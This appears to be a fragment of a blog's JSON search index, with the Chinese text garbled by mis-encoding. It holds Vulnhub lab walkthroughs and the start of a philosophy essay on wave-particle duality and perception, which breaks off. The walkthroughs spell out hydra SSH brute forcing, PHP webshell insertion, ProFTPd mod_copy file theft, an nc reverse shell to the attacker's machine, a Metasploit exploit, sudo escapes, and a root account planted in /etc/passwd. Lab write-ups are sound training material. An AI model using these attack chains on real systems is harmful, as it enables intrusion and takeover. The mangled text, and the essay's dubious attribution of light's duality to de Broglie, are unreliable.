D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hahaha! there is no gift !Your Bad Luck!But what happened if you don&#39;t get gift.Take a hint from my side, which may help you to solve this box further.I make a binary to get another user&#39;s shell,Just google, command for search&#x2F;find SUID or binaries and figure it out how to execute this binary.G00D LUCK! :)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; æœç´¢SUIDæ–‡ä»¶ 1find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null æ‰¾åˆ°æ–‡ä»¶ /opt/exec/chandler æ‰§è¡Œåç”¨æˆ·èº«ä»½å˜ä¸º chandler æŸ¥çœ‹æç¤ºä¿¡æ¯ Base32è§£ç çš„ç»“æœä¸º 1passwd:Y0uCr4ckM3 SSHç™»å…¥chandlerè´¦æˆ· 12ssh chandler@192.168.1.108Y0uCr4ckM3 æŸ¥çœ‹sudoæƒé™ 1sudo -l è¿›è¡Œsudoææƒ 12sudo -u root &#x2F;usr&#x2F;bin&#x2F;ftp!&#x2F;bin&#x2F;bash SUDO &amp; GID ä½¿ç”¨è„šæœ¬åˆ‡æ¢ç”¨æˆ·èº«ä»½æ—¶ï¼Œåªæ˜¯ç®€å•åœ°æ›´æ¢äº†UIDä¸GIDï¼Œå¹¶æ²¡æœ‰æ·»åŠ ç”¨æˆ·æ‰€å±çš„groupsï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è¿›è¡Œsudoææƒè€Œæ˜¯éœ€è¦ä½¿ç”¨SSHç™»å…¥ä¹‹åå†ææƒ å‚è€ƒèµ„æ–™ WalkThrough symfonos 2 2020/10/28 08:21:48 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -T5 -v -n 192.168.1.107 Webè·¯å¾„æ‰«æ dirb http://192.168.1.107/ -w æ¼æ´åˆ©ç”¨ æ”¶é›†smbä¿¡æ¯ enum4linux 192.168.1.107 ç›®å½•/anonymouså¯ä»¥åŒ¿åè®¿é—®ï¼Œä½¿ç”¨ç©ºè´¦æˆ·å³å¯ç™»å…¥ ä¸”è·å¾—ç”¨æˆ·åaeolusï¼Œcronus ä¸‹è½½å¹¶æŸ¥çœ‹log.txt å†…å®¹ä¸ºsmb.confä¸proftpd.conf smbçš„/anonymousè·¯å¾„å¯¹åº”/home/aeolus/share/ ftpå­˜åœ¨åŒ¿åè®¿é—® å°è¯•åŒ¿åè®¿é—®FTPæœåŠ¡ 12345ftp 192.1068.1.107anonymousanonymoussite cpfr &#x2F;var&#x2F;backups&#x2F;shadow.baksite cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak é€šè¿‡smbæœåŠ¡è·å–shadowçš„å¤‡ä»½æ–‡ä»¶ ä½¿ç”¨johnç ´è§£Hash å¾—åˆ°è´¦æˆ·ä¿¡æ¯aeolus:sergioteamo ä½¿ç”¨è´¦æˆ·ä¿¡æ¯ç™»å…¥SSH æƒé™æå‡ æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 12cat &#x2F;etc&#x2F;*releaseuname -a æŸ¥çœ‹ç½‘ç»œç«¯å£ 1ss -antlp ç›®æ ‡å¯¹æœ¬åœ°å¼€æ”¾25ï¼Œ3306ï¼Œ8080ç«¯å£ ä½¿ç”¨ncæ¢æµ‹æœ¬åœ°8080ç«¯å£ æœ¬åœ°8080ç«¯å£å­˜åœ¨WebæœåŠ¡ è¿›è¡Œç«¯å£è½¬å‘ 1socat tcp-listen:1235,fork tcp-connect:localhost:8080 &amp; ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç›®æ ‡1235ç«¯å£ ä½¿ç”¨aeolusè´¦æˆ·è¿›è¡Œç™»å…¥ æŸ¥è¯¢ç›¸å…³æ¼æ´ 1searchsploit librenms ä½¿ç”¨MSF 123456789msfconsoleuse exploit&#x2F;linux&#x2F;http&#x2F;librenms_addhost_cmd_injectset RHOST 192.168.1.107set RPORT 1235set USERNAME aeolusset PASSWORD sergioteamoset LHOST 192.168.1.103set LPORT 9999exploit è·å–tty 1python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; æŸ¥çœ‹sudoæƒé™ 1sudo -l è¿›è¡Œsudoææƒ 1sudo -u root mysql -e &#39;\\! &#x2F;bin&#x2F;bash&#39; ProFRPd 1.3.5 mod_copy è¯¥æ¨¡å—å…è®¸æœªæˆæƒç”¨æˆ·è¿›è¡Œä»»æ„æ–‡ä»¶æ‹·è´æ“ä½œï¼Œé…åˆSMBè®¿é—®ä»¥åŠå·²çŸ¥SMBè·¯å¾„å³å¯å®Œæˆä»»æ„æ–‡ä»¶ä¸‹è½½/ä¸Šä¼ æ“ä½œ è¯¥æ¨¡å—ä¹Ÿå­˜åœ¨å†™å…¥Webshellçš„æ“ä½œï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ 1234site cpfr &#x2F;proc&#x2F;self&#x2F;cmdlinesite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php å‚è€ƒèµ„æ–™ WalkThrough å†™å…¥WebShell FishyMail 2020/11/04 20:52:24 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -A -T5 -v -n Webè·¯å¾„æ‰«æ dirb http://192.168.1.103/ -w æ¼æ´åˆ©ç”¨ è®¿é—® http://192.168.1.103:8080/robots.txt 12345User-agent: *Disallow:&#x2F;spongebob&#x2F;dataentry&#x2F;fishymailer ç»§ç»­æšä¸¾ç›®å½• /dataentry/ ä¸‹çš„è·¯åŠ² æšä¸¾ç›®å½• /dataentry/backup/admin/files/ ä¸‹çš„æ–‡ä»¶ è®¿é—® http://192.168.1.103:8080/dataentry/backup/admin/files/dir.txt å¯¹å†…å®¹è¿›è¡Œè§£ç  æ„é€ å­—å…¸è¿›è¡ŒSSHçˆ†ç ´ 123456789101112131415cat words1spongebobSandysquidward0ctopuspatrickchocolateflavoredWATERdirtysalmon chinookadminrootusertestpearlkrabs 1hydra -I -L words1 -P words1 ssh:&#x2F;&#x2F;192.168.1.103:2600 ä½¿ç”¨ squidward è´¦æˆ·ç™»å…¥SSHæœåŠ¡ 12ssh squidward@192.168.1.103 -p 26000ctopus æƒé™æå‡ æŸ¥çœ‹ä¿¡æ¯ cat /BikiniBottom-db.sql è¿›è¡ŒBase64è§£ç  åœ¨çº¿MD5è§£å¯† 12345spongebob:sandysquidward:0ctopuspatrick:dirtysalmon:crabby4evaSandy:astronaut æ„é€ å­—å…¸è¿›è¡ŒSSHçˆ†ç ´ 12345678910cat words2spongebobsandysquidward0ctopuspatrickdirtysalmoncrabby4evaSandyastronaut 1hydra -I -L words2 -P words2 ssh:&#x2F;&#x2F;192.168.1.103:2600 ä½¿ç”¨è´¦æˆ· dirtysalmon ç™»å…¥SSHæœåŠ¡ 12ssh dirtysalmon@192.168.1.103 -p 2600crabby4eva æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 12uname -aOpenBSD fishymail.Home 6.6 GENERIC#353 amd64 æœç´¢ç›¸å…³ææƒæ¼æ´ 1searchsploit openbsd 6 è¿›è¡Œææƒæ“ä½œ ksh squidwardè´¦æˆ·å—åˆ°äº†kshçš„é™åˆ¶ï¼Œå¾ˆå¤šå‘½ä»¤æ— æ³•æ‰§è¡Œï¼Œå°è¯•è¿‡åˆ‡æ¢æˆ/bin/shï¼Œä½†æ˜¯æ— æ³•å®ç° å‚è€ƒèµ„æ–™ WalkThrough Hemisphere: Lynx 2020/11/06 23:22:46 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -T5 -v -n 192.168.56.104 Webè·¯å¾„æ‰«æ dirb http://192.168.56.104/ æ¼æ´åˆ©ç”¨ æšä¸¾smbæœåŠ¡ç›¸å…³ä¿¡æ¯ enum4linux 192.168.56.104 å¾—åˆ°ç”¨æˆ·å johannes è®¿é—® http://192.168.56.104 è·å–ç½‘ç«™æ–‡æœ¬å†…å®¹ 1cewl http:&#x2F;&#x2F;192.168.56.104&#x2F; &gt; pass è¿›è¡ŒSSHçˆ†ç ´ 1hydra -I -l johannes -P pass ssh:&#x2F;&#x2F;192.168.56.104 1[22][ssh] host: 192.168.56.104 login: johannes password: constelaciones å¾—åˆ°è´¦æˆ· johannes:constelaciones ç™»å…¥SSHæœåŠ¡ 12ssh johannes@192.168.56.104constelaciones æƒé™æå‡ æŸ¥çœ‹æ¡Œé¢ä¿å­˜çš„ä¿¡æ¯ 12cat &#x2F;home&#x2F;johannes&#x2F;Desktop&#x2F;.creds MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; è¿›è¡ŒBase64è§£ç  12echo -n MjBLbDdpUzFLQ2FuaU84RFdNemg6dG9vcg&#x3D;&#x3D; | base64 -d20Kl7iS1KCaniO8DWMzh:toor é€†åºè¾“å‡º 12python3 -c &#39;print(&quot;20Kl7iS1KCaniO8DWMzh:toor&quot;[::-1])&#39;root:hzMWD8OinaCK1Si7lK02 åˆ‡æ¢åˆ°rootç”¨æˆ· 12su roothzMWD8OinaCK1Si7lK02 ColddBox: Easy 2020/11/06 13:06:15 å¯»æ‰¾é¶æœºIP nmap -sn -T5 192.168.56.0/24 | grep -B2 virtual ç«¯å£æ‰«æ nmap -p 1-65535 -sV -T5 -v -n 192.168.56.106 Webè·¯å¾„æ‰«æ dirb http://192.168.56.106/ æ¼æ´åˆ©ç”¨ ä½¿ç”¨wpscanè¿›è¡Œç”¨æˆ·åæšä¸¾ wpscan --url http://192.168.56.106 -e u ä½¿ç”¨wpscanè¿›è¡Œè´¦æˆ·çˆ†ç ´ wpscan --url http://192.168.56.106 -e u -t 50 -P /usr/share/wordlists/FuzzDicts-master/passwordDict/top1000.txt ä½¿ç”¨è´¦æˆ· c0ldd:9876543210 è¿›è¡Œç™»å…¥ http://192.168.56.106/wp-login.php ç™»å…¥ä¹‹åè¿›è¡Œä¿®æ”¹ 1Appearance -&gt; Editor -&gt; 404.php æ’å…¥PHPShell 1&lt;?php system($_GET[&quot;cmd&quot;]);?&gt; éªŒè¯Shell è®¿é—® http://192.168.56.106/?p=2&amp;cmd=whoami ï¼Œå¾—åˆ°å›æ˜¾ www-data ç›‘å¬ç«¯å£ 1nc -lvnp 9900 åå¼¹Shell è®¿é—® http://192.168.56.106/?p=2&amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.56.103%209900%20%3E%2Ftmp%2Ff æƒé™æå‡ æŸ¥çœ‹æ•°æ®åº“é…ç½®ä¿¡æ¯ 1cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wp-config.php å¾—åˆ°æ•°æ®åº“è´¦æˆ· c0ldd:cybersecurity å°è¯•ä½¿ç”¨è¯¥è´¦æˆ·ç™»å…¥SSHæœåŠ¡ 12ssh c0ldd@192.168.56.106cybersecurity ç™»å…¥æˆåŠŸ æŸ¥çœ‹SUDOæƒé™ 1sudo -l ç”ŸæˆHash 12openssl passwd -6 hackforfun$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9. ä»¥rootèº«ä»½ä¿®æ”¹æ–‡ä»¶ /etc/passwd 1sudo -u root &#x2F;usr&#x2F;bin&#x2F;vim &#x2F;etc&#x2F;passwd æ’å…¥å¦‚ä¸‹å†…å®¹ 1test:$6$bCV9&#x2F;Q0G2hJVB579$PPqUpRwZ30NbVukP6UNGBv7torHFc1cQTs7XqgDT1x71w1xx36V.jG15pE8d1rcw&#x2F;qt3Bfr.xzZ3eFtpMJEs9.:0:0::&#x2F;:&#x2F;bin&#x2F;bash åˆ‡æ¢è‡³è´¦æˆ· test 12su testhackforfun å³å¯è·å¾—rootæƒé™ å‚è€ƒèµ„æ–™ WalkThrough EOF","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"}]},{"title":"å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºçš„è”ç³»åˆ†æ","slug":"An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived","date":"2023-02-07T16:18:30.000Z","updated":"2023-02-07T16:52:17.046Z","comments":true,"path":"2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/","link":"","permalink":"https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/","excerpt":"ç®€ä»‹ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ¦‚è¿° å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå’Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºåˆ†åˆ«æ˜¯ç‰©ç†å­¦å’Œå“²å­¦ä¸­ä¸¤ä¸ªé‡è¦ä¸”ç›¸äº’å…³è”çš„æ¦‚å¿µã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºæ˜¯é‡å­åŠ›å­¦çš„æ ¸å¿ƒåŸç†ï¼Œå®ƒæè¿°äº†å…‰æ—¢æ˜¯æ³¢åˆæ˜¯ç²’å­çš„åŒé‡æ€§è´¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ˜¯ä¸€ç§å“²å­¦æ€æƒ³ï¼Œè¡¨æ˜å­˜åœ¨æˆ–ç°å®åªèƒ½é€šè¿‡è§‚å¯Ÿè€…æˆ–æ„è¯†æ¥æ„ŸçŸ¥ã€‚ ç ”ç©¶ç›®çš„åŠæ„ä¹‰ æœ¬ç ”ç©¶çš„ç›®çš„æ˜¯æ£€éªŒè¿™ä¸¤ç§ç†è®ºä¹‹é—´çš„å…³ç³»ï¼Œå¹¶æ¢è®¨å®ƒä»¬å¯¹æˆ‘ä»¬ç†è§£ç°å®çš„å½±å“ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå·²å¾—åˆ°å¹¿æ³›ç ”ç©¶å’Œå®éªŒè¯æ˜ï¼Œå¹¶è¢«å¹¿æ³›æ¥å—ä¸ºç‰©ç†å­¦çš„åŸºæœ¬åŸç†ã€‚ä¸æ­¤åŒæ—¶ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºå·²ç»è¢«å“²å­¦å®¶ä»¬è®¨è®ºå’Œäº‰è®ºäº†å‡ ä¸ªä¸–çºªï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸€ä¸ªä¸æ–­æ¢ç´¢å’Œæ¢ç©¶çš„è¯é¢˜ã€‚ è¿™ä¸¤ä¸ªç†è®ºä¹‹é—´çš„è”ç³»æ„ä¹‰é‡å¤§ï¼Œå› ä¸ºå®ƒä¸ºæˆ‘ä»¬ç†è§£ç°å®çš„æœ¬è´¨æä¾›äº†æ–°çš„æ€è·¯ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºè¡¨æ˜ï¼Œå…‰å¯ä»¥è¡¨ç°å‡ºæ³¢çŠ¶å’Œç²’å­çŠ¶ä¸¤ç§ç‰¹æ€§ï¼Œè¿™å–å†³äºå®ƒè¢«è§‚å¯Ÿæˆ–æµ‹é‡çš„æ–¹å¼ã€‚åŒæ—¶ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè¡¨æ˜ï¼Œå­˜åœ¨åªèƒ½é€šè¿‡æ„è¯†æ¥æ„ŸçŸ¥ã€‚å½“ä¸€èµ·è€ƒè™‘æ—¶ï¼Œè¿™äº›ç†è®ºè¡¨æ˜ç°å®çš„æœ¬è´¨å¯èƒ½æ˜¯å†…åœ¨ä¸»è§‚çš„ï¼Œå¹¶ä¸”å®ƒä¼šå—åˆ°è§‚å¯Ÿæˆ–æ„ŸçŸ¥æ–¹å¼çš„å½±å“ã€‚ é™¤äº†å¯¹æˆ‘ä»¬ç†è§£ç°å®çš„å½±å“ä¹‹å¤–ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è¿™ç§è”ç³»è¿˜æœ‰å¯èƒ½å½±å“å…¶ä»–ç ”ç©¶é¢†åŸŸã€‚ä¾‹å¦‚ï¼Œå®ƒå¯èƒ½å¯¹æ„è¯†ç ”ç©¶é¢†åŸŸæœ‰å½±å“ï¼Œå› ä¸ºå®ƒè¡¨æ˜æ„è¯†å¯èƒ½åœ¨å¡‘é€ ç°å®çš„æœ¬è´¨æ–¹é¢å‘æŒ¥ä½œç”¨ã€‚åŒæ ·ï¼Œè¿™ç§è”ç³»ä¹Ÿå¯èƒ½å¯¹äººå·¥æ™ºèƒ½å’Œæœºå™¨å­¦ä¹ é¢†åŸŸäº§ç”Ÿå½±å“ï¼Œå› ä¸ºå®ƒæå‡ºäº†å…³äºæ„è¯†ã€æ„ŸçŸ¥å’Œç°å®ä¹‹é—´å…³ç³»çš„é—®é¢˜ã€‚ æ€»çš„æ¥è¯´ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„å…³ç³»æ˜¯ä¸€ä¸ªä¸æ–­æ¢ç´¢å’Œæ¢ç©¶çš„è¯¾é¢˜ã€‚é€šè¿‡å¯¹è¿™ç§è”ç³»çš„æ›´æ·±å…¥ç†è§£ï¼Œæˆ‘ä»¬æˆ–è®¸èƒ½å¤Ÿè·å¾—å¯¹ç°å®æœ¬è´¨çš„æ–°è§è§£ï¼Œå¹¶æ¢ç´¢è¿™äº›ç†è®ºå¯¹å…¶ä»–ç ”ç©¶é¢†åŸŸçš„å½±å“ã€‚æœ¬ç ”ç©¶æ—¨åœ¨ä¸ºè¿™ç§æ­£åœ¨è¿›è¡Œçš„æ¢ç´¢å’Œæ¢ç©¶åšå‡ºè´¡çŒ®ï¼Œå¹¶åŠ æ·±æˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªé‡è¦ç†è®ºä¹‹é—´è”ç³»çš„ç†è§£ã€‚","text":"ç®€ä»‹ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ¦‚è¿° å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå’Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºåˆ†åˆ«æ˜¯ç‰©ç†å­¦å’Œå“²å­¦ä¸­ä¸¤ä¸ªé‡è¦ä¸”ç›¸äº’å…³è”çš„æ¦‚å¿µã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºæ˜¯é‡å­åŠ›å­¦çš„æ ¸å¿ƒåŸç†ï¼Œå®ƒæè¿°äº†å…‰æ—¢æ˜¯æ³¢åˆæ˜¯ç²’å­çš„åŒé‡æ€§è´¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ˜¯ä¸€ç§å“²å­¦æ€æƒ³ï¼Œè¡¨æ˜å­˜åœ¨æˆ–ç°å®åªèƒ½é€šè¿‡è§‚å¯Ÿè€…æˆ–æ„è¯†æ¥æ„ŸçŸ¥ã€‚ ç ”ç©¶ç›®çš„åŠæ„ä¹‰ æœ¬ç ”ç©¶çš„ç›®çš„æ˜¯æ£€éªŒè¿™ä¸¤ç§ç†è®ºä¹‹é—´çš„å…³ç³»ï¼Œå¹¶æ¢è®¨å®ƒä»¬å¯¹æˆ‘ä»¬ç†è§£ç°å®çš„å½±å“ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå·²å¾—åˆ°å¹¿æ³›ç ”ç©¶å’Œå®éªŒè¯æ˜ï¼Œå¹¶è¢«å¹¿æ³›æ¥å—ä¸ºç‰©ç†å­¦çš„åŸºæœ¬åŸç†ã€‚ä¸æ­¤åŒæ—¶ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºå·²ç»è¢«å“²å­¦å®¶ä»¬è®¨è®ºå’Œäº‰è®ºäº†å‡ ä¸ªä¸–çºªï¼Œä½†å®ƒä»ç„¶æ˜¯ä¸€ä¸ªä¸æ–­æ¢ç´¢å’Œæ¢ç©¶çš„è¯é¢˜ã€‚ è¿™ä¸¤ä¸ªç†è®ºä¹‹é—´çš„è”ç³»æ„ä¹‰é‡å¤§ï¼Œå› ä¸ºå®ƒä¸ºæˆ‘ä»¬ç†è§£ç°å®çš„æœ¬è´¨æä¾›äº†æ–°çš„æ€è·¯ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºè¡¨æ˜ï¼Œå…‰å¯ä»¥è¡¨ç°å‡ºæ³¢çŠ¶å’Œç²’å­çŠ¶ä¸¤ç§ç‰¹æ€§ï¼Œè¿™å–å†³äºå®ƒè¢«è§‚å¯Ÿæˆ–æµ‹é‡çš„æ–¹å¼ã€‚åŒæ—¶ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè¡¨æ˜ï¼Œå­˜åœ¨åªèƒ½é€šè¿‡æ„è¯†æ¥æ„ŸçŸ¥ã€‚å½“ä¸€èµ·è€ƒè™‘æ—¶ï¼Œè¿™äº›ç†è®ºè¡¨æ˜ç°å®çš„æœ¬è´¨å¯èƒ½æ˜¯å†…åœ¨ä¸»è§‚çš„ï¼Œå¹¶ä¸”å®ƒä¼šå—åˆ°è§‚å¯Ÿæˆ–æ„ŸçŸ¥æ–¹å¼çš„å½±å“ã€‚ é™¤äº†å¯¹æˆ‘ä»¬ç†è§£ç°å®çš„å½±å“ä¹‹å¤–ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è¿™ç§è”ç³»è¿˜æœ‰å¯èƒ½å½±å“å…¶ä»–ç ”ç©¶é¢†åŸŸã€‚ä¾‹å¦‚ï¼Œå®ƒå¯èƒ½å¯¹æ„è¯†ç ”ç©¶é¢†åŸŸæœ‰å½±å“ï¼Œå› ä¸ºå®ƒè¡¨æ˜æ„è¯†å¯èƒ½åœ¨å¡‘é€ ç°å®çš„æœ¬è´¨æ–¹é¢å‘æŒ¥ä½œç”¨ã€‚åŒæ ·ï¼Œè¿™ç§è”ç³»ä¹Ÿå¯èƒ½å¯¹äººå·¥æ™ºèƒ½å’Œæœºå™¨å­¦ä¹ é¢†åŸŸäº§ç”Ÿå½±å“ï¼Œå› ä¸ºå®ƒæå‡ºäº†å…³äºæ„è¯†ã€æ„ŸçŸ¥å’Œç°å®ä¹‹é—´å…³ç³»çš„é—®é¢˜ã€‚ æ€»çš„æ¥è¯´ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„å…³ç³»æ˜¯ä¸€ä¸ªä¸æ–­æ¢ç´¢å’Œæ¢ç©¶çš„è¯¾é¢˜ã€‚é€šè¿‡å¯¹è¿™ç§è”ç³»çš„æ›´æ·±å…¥ç†è§£ï¼Œæˆ‘ä»¬æˆ–è®¸èƒ½å¤Ÿè·å¾—å¯¹ç°å®æœ¬è´¨çš„æ–°è§è§£ï¼Œå¹¶æ¢ç´¢è¿™äº›ç†è®ºå¯¹å…¶ä»–ç ”ç©¶é¢†åŸŸçš„å½±å“ã€‚æœ¬ç ”ç©¶æ—¨åœ¨ä¸ºè¿™ç§æ­£åœ¨è¿›è¡Œçš„æ¢ç´¢å’Œæ¢ç©¶åšå‡ºè´¡çŒ®ï¼Œå¹¶åŠ æ·±æˆ‘ä»¬å¯¹è¿™ä¸¤ä¸ªé‡è¦ç†è®ºä¹‹é—´è”ç³»çš„ç†è§£ã€‚ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®º ç†è®ºçš„å†å²å‘å±• å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºæœ€æ—©ç”±è·¯æ˜“æ–¯Â·å¾·å¸ƒç½—æ„(Louis de Broglie)åœ¨20ä¸–çºªåˆæå‡ºã€‚è¯¥ç†è®ºæ˜¯ä½œä¸ºå¯¹å…‰çš„æ³¢æ¨¡å‹å’Œç²’å­æ¨¡å‹ä¹‹é—´é•¿æœŸäº‰è®ºçš„å›åº”è€Œå‘å±•èµ·æ¥çš„ï¼Œè¿™ç§äº‰è®ºè‡ªä»å‘ç°å…‰æœ¬èº«ä»¥æ¥å°±ä¸€ç›´å­˜åœ¨ã€‚ç²’å­æ¨¡å‹é¦–å…ˆå‘å±•èµ·æ¥ï¼Œè‰¾è¨å…‹Â·ç‰›é¡¿çˆµå£«æå‡ºå…‰æ˜¯ç”±ç²’å­ç»„æˆçš„ï¼Œè€Œæ³¢åŠ¨æ¨¡å‹æ˜¯åæ¥å‘å±•èµ·æ¥çš„ï¼Œå…‹é‡Œæ–¯è’‚å®‰Â·æƒ æ›´æ–¯å’Œæ‰˜é©¬æ–¯Â·æ¨æå‡ºå…‰æ˜¯ä¸€ç§æ³¢ã€‚ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºæ˜¯ç†è§£å…‰çš„æœ¬è´¨çš„é‡å¤§çªç 